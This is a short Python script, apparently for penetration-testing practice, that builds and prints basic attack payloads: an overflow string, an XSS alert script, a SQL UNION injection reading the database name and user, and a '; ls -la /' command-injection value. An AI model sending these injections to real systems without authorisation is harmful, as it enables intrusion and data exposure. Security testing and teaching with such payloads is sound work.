def generate_long_string_payload(length, char='A'):
    """Generates a long string for buffer overflow testing."""
    payload = char * length
    print(f"Generated payload of length {length}: {payload}")
    return payload

def generate_web_injection_payload(input_name, value, injection_type="xss"):
    """Generates basic web injection payloads."""
    payload = ""
    if injection_type == "xss":
        payload = f'<script>alert("XSS");</script>'
        print(f"XSS Payload: {payload}")
    elif injection_type == "sql_union":
        payload = f"' UNION SELECT null, database(), user() -- -"
        print(f"SQL Union Payload: {payload}")
    elif injection_type == "command_injection":
        payload = f"; ls -la /"
        print(f"Command Injection Payload: {payload}")
    else:
        print(f"Unsupported injection type: {injection_type}")
    return payload

if __name__ == "__main__":
    print("--- Payload Generation Examples ---")
    generate_long_string_payload(100, 'B')
    generate_web_injection_payload("username", "admin", "xss")
    generate_web_injection_payload("id", "1", "sql_union")
    generate_web_injection_payload("filename", "report.txt", "command_injection")